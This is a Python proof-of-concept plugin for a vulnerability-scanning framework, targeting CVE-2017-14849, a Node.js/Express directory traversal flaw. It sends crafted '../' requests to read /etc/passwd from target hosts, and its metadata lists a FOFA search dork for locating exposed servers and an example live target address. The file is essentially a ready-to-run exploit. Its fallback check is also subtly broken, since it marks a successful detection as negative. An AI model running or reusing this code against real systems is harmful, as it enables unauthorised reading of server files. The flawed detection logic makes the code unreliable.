# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "hansi & jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-08-05",      # POC创建时间
        "UpdateDate" : "2021-08-05",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Node.js目录穿越漏洞",                        # 漏洞名称
        "VulnID" : "CVE-2017-14849",               # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Node.js",                     # 漏洞应用名称
        "AppVersion" : """
            Node.js 8.5.0 + Express 3.19.0-3.21.2
            Node.js 8.5.0 + Express 4.11.0-4.15.5
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            node.js 8.5.0 到8.6.0 之间的版本会造成目录穿越漏洞，读取任意文件
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Node.js"
        """,                     # fofa搜索语句
        "example" : "http://18.163.16.130:179",              # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    # timeout = 10


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/../../../a/../../../../etc/passwd" # url自己按需调整
        url1 = self.target + "/static/../../../a/../../../../etc/passwd" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    #  "Content-Type": "application/x-www-form-urlencoded",
                    }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers  , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and "root:*" in req0.text and "bin:x" in req0.text:
                vuln = [True,req0.text]
            else:
                req1 = requests.get(url1,headers = headers  , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and "root:*" in req1.text and "bin:x" in req1.text:
                    vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()